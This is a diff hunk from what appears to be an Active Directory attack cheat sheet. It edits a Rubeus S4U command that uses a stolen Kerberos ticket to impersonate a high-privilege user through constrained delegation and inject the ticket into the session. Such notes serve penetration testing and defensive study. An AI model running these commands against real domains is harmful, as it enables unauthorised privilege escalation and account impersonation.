@@ -749,7 +749,7 @@ tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 Rubeus (optional ```/domain``` ```/dc``` ; and ```/ptt```):
 
 ```
-Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo} /ptt
+Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:high_priv_user_we_want /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo} /ptt
 ```
 
 
